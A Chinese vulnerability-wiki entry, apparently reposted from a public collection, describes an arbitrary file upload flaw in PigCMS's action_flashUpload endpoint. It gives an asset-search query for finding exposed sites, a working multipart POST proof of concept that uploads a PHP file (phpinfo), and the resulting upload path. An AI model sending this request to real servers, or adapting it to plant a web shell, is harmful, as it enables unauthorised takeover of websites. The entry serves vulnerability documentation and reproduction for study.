---
title: "PigCMS action_flashUpload 任意文件上传漏洞"
date: 2026-10-12 09:00:58
categories:
  - WebSecurity
  - CVE
  - "cms"
  - "PigCMS"
tags:
  - "PigCMS"
  - "文件上传"
  - "漏洞复现"
---
## 漏洞描述

PigCMS action_flashUpload 方法中存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件获取到服务器权限

## 漏洞影响

pigcms

## 网络测绘

```
app.name="PigCMS"
```

## 漏洞复现

登陆页面

![image-20230828161452591](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/image-20230828161452591.png)

验证POC

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">POST /cms/manage/admin.php?m=manage&amp;c=background&amp;a=action_flashUpload HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----aaa

------aaa
Content-Disposition: form-data; name="filePath"; filename="test.php"
Content-Type: video/x-flv

&lt;?php phpinfo();?&gt;
------aaa</code></pre>

</details>

![image-20230828161506565](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/image-20230828161506565.png)

```
/cms/upload/images/2023/08/11/1691722887xXbx.php
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cms/PigCMS-action_flashUpload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md)
